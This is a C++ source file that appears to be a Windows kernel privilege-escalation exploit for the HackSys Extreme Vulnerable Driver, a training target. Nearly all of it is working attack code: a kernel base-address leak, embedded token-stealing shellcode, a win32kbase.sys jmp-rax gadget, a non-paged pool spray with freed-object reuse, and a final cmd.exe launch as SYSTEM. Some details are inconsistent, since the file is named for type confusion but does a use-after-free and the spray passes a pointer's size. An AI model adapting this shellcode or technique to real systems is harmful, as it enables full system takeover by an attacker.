// HEVD_TYPECONFUSION.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <Psapi.h>
//#include <sysinfoapi.h>

#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)

#include <iostream>

//NTSTATUS Codes Defined
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

//Define IO_COMPLETION_OBJECT
#define IO_COMPLETION_OBJECT 1

//Define IOCTLS
#define IOCTL_ALLOC 0x222013
#define IOCTL_FREE 0x22201B
#define IOCTL_ALLOC_FAKE_OBJ 0x22201F
#define IOCTL_USE_FAKE_OBJ 0x222017

//Maximum File Length
#define MAXIMUM_FILENAME_LENGTH 255 

//Fake Object Size
#define FAKE_OBJECT_SIZE 60


HANDLE hevd;

LPVOID drivers[0x500] = { 0 }; // Should be more than enough
DWORD cbNeeded;
LPVOID ntoskrnlBase = NULL, hevdBase = NULL;

DWORD _GetVersion()
{
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;

	dwVersion = GetVersion();

	// Get the Windows version.

	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.

	if (dwVersion < 0x80000000)
		dwBuild = (DWORD)(HIWORD(dwVersion));

	printf("Version is %d.%d (%d)\n",
		dwMajorVersion,
		dwMinorVersion,
		dwBuild);

	return dwVersion;
}

LPVOID LeakModuleBaseAddress(char* module)
{
	LPVOID moduleBase = NULL;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
			char szDriver[0x100] = { 0 }; // Again, more than enough
			GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
			if (strcmp(module, szDriver) == 0) {
				moduleBase = drivers[i];
				printf("[+] Found %s at: 0x%p\n", module, moduleBase);
			}

			if (moduleBase) break;
		}
	}
	else {
		printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
		return NULL;
	}

	if (!moduleBase) {
		printf("[-] Failed to find the base of %s\n", module);
		return NULL;
	}
	else
	{
		return moduleBase;
	}

}


char TokenSteal[] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89,
		0xC3, 0x48, 0x8B, 0x9B, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x8B, 0x40, 0x04, 0x00,
		0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0xB8, 0x04, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0xB8,
		0x04, 0x00, 0x00, 0x48, 0x31, 0xC0, 0xC3 };


void SprayNonPagedPool(LPVOID shellcode)
{
	BOOL res = 0;
	DWORD BytesReturned = 0;

	printf("[+] Spraying fake objects\n");

	for (int i = 0; i < 5000; i++)
	{
		res = DeviceIoControl(hevd, IOCTL_ALLOC_FAKE_OBJ, shellcode, sizeof(shellcode), NULL, 0, &BytesReturned, NULL);

		if (!res)
		{
			DWORD err = GetLastError();
			printf("[+] DeviceIoControl, error: %p\n", err);
		}
		
	}
	

}


int main()
{
	DWORD version = _GetVersion();

	if (version != 0x23f00206) //Windows 10 21h2 19044.1586
	{
		printf("exploit not supported for this Windows OS. Yo need to adjust ROP gadgets and maybe the shellcode\n");
		system("pause");
		return -1;
	}

	int ShellcodeSize = sizeof(TokenSteal); //0x43
	hevd = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0,
		NULL,
		0x3,
		0,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open", GetLastError());
		return -1;
	}
	else
	{
		printf("[-] Valid handle opened\n");
	}


	LPVOID shellcode = VirtualAlloc(
		NULL,				// Next page to commit
		0x58,		        // Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access

	if (shellcode == NULL) {
		printf("[-] Unable to reserve memory for shellcode!\n");
		return -1;
	}

	LPVOID shellcode_0x10 = (LPVOID)((ULONGLONG)shellcode + 0x10);
	memcpy(shellcode_0x10, (LPVOID)TokenSteal, sizeof(TokenSteal));

	LPVOID moduleBaseNtos = LeakModuleBaseAddress((char*)"ntoskrnl.exe");
	LPVOID moduleBasewin32kbase = LeakModuleBaseAddress((char*)"win32kbase.sys");

	DWORD jmp_rax = 0x13cbd0; //0x1c013cbd0: jmp rax ; \xff\xe0 (1 found) win32kbase.sys
	BYTE InputBuffer[0x58];
	memset(InputBuffer, 0x00, sizeof(InputBuffer));

	*(ULONGLONG*)(InputBuffer) = (ULONGLONG)((ULONGLONG)moduleBasewin32kbase + jmp_rax);
	*(ULONGLONG*)(InputBuffer+0x8) = (ULONGLONG)((ULONGLONG)0x9090909090909045);
	memcpy(shellcode, InputBuffer, 0x10);


	bool res = 0;
	DWORD BytesReturned = 0;



	//DeviceCall
	DeviceIoControl(hevd, IOCTL_ALLOC, NULL, 0, NULL, 0, &BytesReturned, NULL);
	printf("[+] Free Chunk of Memory\n");
	DeviceIoControl(hevd, IOCTL_FREE, NULL, 0, NULL, 0, &BytesReturned, NULL);
	SprayNonPagedPool(shellcode);


	printf("[+] Use Fake object\n");
	DeviceIoControl(hevd, IOCTL_USE_FAKE_OBJ, NULL, 0, NULL, 0, &BytesReturned, NULL);

	DWORD err = GetLastError();
	printf("[+] DeviceIoControl, error: %p\n", err);

	system("cmd.exe");

}

